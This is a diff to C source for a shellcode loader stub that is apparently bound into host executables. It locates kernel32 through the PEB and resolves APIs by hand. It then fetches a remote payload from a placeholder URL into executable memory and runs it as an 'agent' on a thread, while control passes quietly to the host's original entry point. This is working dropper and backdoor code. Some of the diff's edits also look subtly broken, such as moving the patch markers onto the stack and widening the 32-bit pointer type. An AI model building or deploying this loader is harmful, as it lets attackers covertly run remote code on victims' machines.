@@ -19,35 +19,32 @@
  * stub-x64.bin / stub-x86.bin. See stub.ld + release.yml.
  */
 
-#include <intrin.h>   /* provides __readgsqword / __readfsdword as inline intrinsics (no CRT) */
+#include <intrin.h> /* provides __readgsqword / __readfsdword as inline intrinsics (no CRT) */
 
 #ifdef __x86_64__
 typedef unsigned long long uptr;
-#define PEB()        ((uptr)__readgsqword(0x60))
-#define LDR_OFF      0x18
-#define INMEM_OFF    0x20
-#define INLOAD_OFF   0x10
-#define DBASE_INMEM  0x20   /* DllBase offset from an InMemoryOrderLinks node */
-#define DBASE_INLOAD 0x30   /* DllBase offset from an InLoadOrderLinks node   */
-#define EXPDIR_OFF   0x88   /* export data dir RVA field, from e_lfanew       */
+#define PEB() ((uptr)__readgsqword(0x60))
+#define LDR_OFF 0x18
+#define INMEM_OFF 0x20
+#define INLOAD_OFF 0x10
+#define DBASE_INMEM 0x20  /* DllBase offset from an InMemoryOrderLinks node */
+#define DBASE_INLOAD 0x30 /* DllBase offset from an InLoadOrderLinks node   */
+#define EXPDIR_OFF 0x88   /* export data dir RVA field, from e_lfanew       */
 #else
-typedef unsigned int uptr;
-#define PEB()        ((uptr)__readfsdword(0x30))
-#define LDR_OFF      0x0C
-#define INMEM_OFF    0x14
-#define INLOAD_OFF   0x0C
-#define DBASE_INMEM  0x10
+typedef unsigned long long uptr;
+#define PEB() ((uptr)__readfsdword(0x30))
+#define LDR_OFF 0x0C
+#define INMEM_OFF 0x14
+#define INLOAD_OFF 0x0C
+#define DBASE_INMEM 0x10
 #define DBASE_INLOAD 0x18
-#define EXPDIR_OFF   0x78
+#define EXPDIR_OFF 0x78
 #endif
 
 typedef unsigned int u32;
 typedef unsigned short u16;
 
 /* ── Patched data (ASCII-findable by LoaderUrlPatcher) ─────────────────────── */
-
-static char g_url[256] = "SHELLCODE_URL_PLACEHOLDER";
-static volatile char c2_oep[12] = "C2OEPRAV";   /* volatile: prevent the -O2 constant-fold that erased this marker */
 
 /* ── API function-pointer types ───────────────────────────────────────────── */
 
@@ -59,11 +56,11 @@ typedef void *(*InternetOpenA_t)(const char *agent, u32 access, const char *prox
 typedef void *(*InternetOpenUrlA_t)(void *hInternet, const char *url, const char *headers, u32 hlen, u32 flags, uptr ctx);
 typedef int (*InternetReadFile_t)(void *hFile, void *buf, u32 toRead, u32 *bytesRead);
 
-static GetProcAddress_t   pGetProcAddress;
-static LoadLibraryA_t     pLoadLibraryA;
-static VirtualAlloc_t     pVirtualAlloc;
-static CreateThread_t     pCreateThread;
-static InternetOpenA_t    pInternetOpenA;
+static GetProcAddress_t pGetProcAddress;
+static LoadLibraryA_t pLoadLibraryA;
+static VirtualAlloc_t pVirtualAlloc;
+static CreateThread_t pCreateThread;
+static InternetOpenA_t pInternetOpenA;
 static InternetOpenUrlA_t pInternetOpenUrlA;
 static InternetReadFile_t pInternetReadFile;
 
@@ -71,7 +68,13 @@ static InternetReadFile_t pInternetReadFile;
 
 static int streq(const char *a, const char *b)
 {
-    while (*a && *b) { if (*a != *b) return 0; a++; b++; }
+    while (*a && *b)
+    {
+        if (*a != *b)
+            return 0;
+        a++;
+        b++;
+    }
     return *a == *b;
 }
 
@@ -80,20 +83,20 @@ static uptr kernel32_base(void)
 {
     uptr peb = PEB();
     uptr ldr = *(uptr *)(peb + LDR_OFF);
-    uptr e   = *(uptr *)(ldr + INMEM_OFF);   /* 1st entry's InMemoryOrderLinks */
-    e = *(uptr *)e;                          /* 2nd */
-    e = *(uptr *)e;                          /* 3rd (kernel32) */
+    uptr e = *(uptr *)(ldr + INMEM_OFF); /* 1st entry's InMemoryOrderLinks */
+    e = *(uptr *)e;                      /* 2nd */
+    e = *(uptr *)e;                      /* 3rd (kernel32) */
     return *(uptr *)(e + DBASE_INMEM);
 }
 
 static void *resolve_export(uptr base, const char *name)
 {
     u32 e_lfanew = *(u32 *)(base + 0x3c);
-    uptr expDir  = base + *(u32 *)(base + e_lfanew + EXPDIR_OFF);
+    uptr expDir = base + *(u32 *)(base + e_lfanew + EXPDIR_OFF);
     u32 numNames = *(u32 *)(expDir + 0x18);
-    uptr names   = base + *(u32 *)(expDir + 0x20);
-    uptr funcs   = base + *(u32 *)(expDir + 0x1c);
-    uptr ords    = base + *(u32 *)(expDir + 0x24);
+    uptr names = base + *(u32 *)(expDir + 0x20);
+    uptr funcs = base + *(u32 *)(expDir + 0x1c);
+    uptr ords = base + *(u32 *)(expDir + 0x24);
 
     for (u32 i = 0; i < numNames; i++)
     {
@@ -111,42 +114,49 @@ static void *resolve_export(uptr base, const char *name)
 
 static void download_thread(void *param)
 {
+    char g_url[256] = "SHELLCODE_URL_PLACEHOLDER";
     (void)param;
     void *buf = pVirtualAlloc(0, 0x400000, 0x3000 /*COMMIT|RESERVE*/, 0x40 /*RWX*/);
-    if (!buf) return;
+    if (!buf)
+        return;
 
     void *hInternet = pInternetOpenA(0, 0, 0, 0, 0);
-    if (!hInternet) return;
+    if (!hInternet)
+        return;
 
     void *hUrl = pInternetOpenUrlA(hInternet, g_url, 0, 0, 0x84000000 /*RELOAD|NO_CACHE_WRITE*/, 0);
-    if (!hUrl) return;
+    if (!hUrl)
+        return;
 
     uptr off = 0;
     u32 got = 0;
-    do {
+    do
+    {
         pInternetReadFile(hUrl, (char *)buf + off, 0x100000, &got);
         off += got;
     } while (got && off < 0x400000);
 
-    if (off) ((void (*)(void))buf)();   /* run the PIC agent */
+    if (off)
+        ((void (*)(void))buf)(); /* run the PIC agent */
 }
 
 /* ── Entry (placed first in .text via section attr) ───────────────────────── */
 
-__attribute__((section(".text.start"), used))
-void _start(void)
+__attribute__((section(".text.start"), used)) void _start(void)
 {
+
     uptr k32 = kernel32_base();
 
     pGetProcAddress = (GetProcAddress_t)resolve_export(k32, "GetProcAddress");
-    pLoadLibraryA   = (LoadLibraryA_t)resolve_export(k32, "LoadLibraryA");
-    pVirtualAlloc   = (VirtualAlloc_t)pGetProcAddress((void *)k32, "VirtualAlloc");
-    pCreateThread   = (CreateThread_t)pGetProcAddress((void *)k32, "CreateThread");
+    pLoadLibraryA = (LoadLibraryA_t)resolve_export(k32, "LoadLibraryA");
+
+    pVirtualAlloc = (VirtualAlloc_t)pGetProcAddress((void *)k32, "VirtualAlloc");
+    pCreateThread = (CreateThread_t)pGetProcAddress((void *)k32, "CreateThread");
 
     void *wininet = pLoadLibraryA("wininet.dll");
     if (wininet)
     {
-        pInternetOpenA    = (InternetOpenA_t)pGetProcAddress(wininet, "InternetOpenA");
+        pInternetOpenA = (InternetOpenA_t)pGetProcAddress(wininet, "InternetOpenA");
         pInternetOpenUrlA = (InternetOpenUrlA_t)pGetProcAddress(wininet, "InternetOpenUrlA");
         pInternetReadFile = (InternetReadFile_t)pGetProcAddress(wininet, "InternetReadFile");
     }
@@ -155,12 +165,16 @@ void _start(void)
         pCreateThread(0, 0, download_thread, 0, 0, 0);
 
     /* Resume the host: exe base (PEB.Ldr.InLoadOrderModuleList[0]) + patched OEP RVA. */
-    uptr peb   = PEB();
-    uptr ldr   = *(uptr *)(peb + LDR_OFF);
+    uptr peb = PEB();
+    uptr ldr = *(uptr *)(peb + LDR_OFF);
     uptr first = *(uptr *)(ldr + INLOAD_OFF);
-    uptr base  = *(uptr *)(first + DBASE_INLOAD);
-    u32 oep    = *(volatile u32 *)(c2_oep + 8);   /* original entry-point RVA (patched by binder) */
+    uptr base = *(uptr *)(first + DBASE_INLOAD);
+    volatile char c2_oep[12] = "C2OEPRAV"; /* volatile: prevent the -O2 constant-fold that erased this marker */
+
+    u32 oep = *(volatile u32 *)(c2_oep + 8); /* original entry-point RVA (patched by binder) */
     ((void (*)(void))(base + oep))();
 
-    for (;;) {}   /* never reached for an EXE entry */
+    for (;;)
+    {
+    } /* never reached for an EXE entry */
 }
